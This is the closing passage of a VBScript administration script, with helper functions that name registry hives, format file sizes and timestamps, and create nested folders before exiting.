    On Error GoTo 0
End Sub

Function GetHiveName(lHive)
    Select Case lHive
        Case &H80000002: GetHiveName = "HKLM"
        Case &H80000001: GetHiveName = "HKCU"
        Case Else:        GetHiveName = "UNKNOWN"
    End Select
End Function

Function FormatFileSize(nBytes)
    If nBytes < 1024 Then
        FormatFileSize = nBytes & " B"
    ElseIf nBytes < 1048576 Then
        FormatFileSize = Round(nBytes / 1024, 2) & " KB"
    ElseIf nBytes < 1073741824 Then
        FormatFileSize = Round(nBytes / 1048576, 2) & " MB"
    Else
        FormatFileSize = Round(nBytes / 1073741824, 2) & " GB"
    End If
End Function

Function FormatDateForFile(dtDate)
    FormatDateForFile = Year(dtDate) & Right("0" & Month(dtDate), 2) & _
                        Right("0" & Day(dtDate), 2) & "_" & _
                        Right("0" & Hour(dtDate), 2) & _
                        Right("0" & Minute(dtDate), 2) & _
                        Right("0" & Second(dtDate), 2)
End Function

'==========================================================================
' CREATE NESTED FOLDERS
'==========================================================================
Sub CreateNestedFolders(sPath)
    On Error Resume Next
    If Not oFSO.FolderExists(sPath) Then
        Dim sParentPath
        sParentPath = oFSO.GetParentFolderName(sPath)
        If Not oFSO.FolderExists(sParentPath) Then
            CreateNestedFolders sParentPath
        End If
        oFSO.CreateFolder sPath
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' END OF SCRIPT
'==========================================================================
WScript.Quit(0)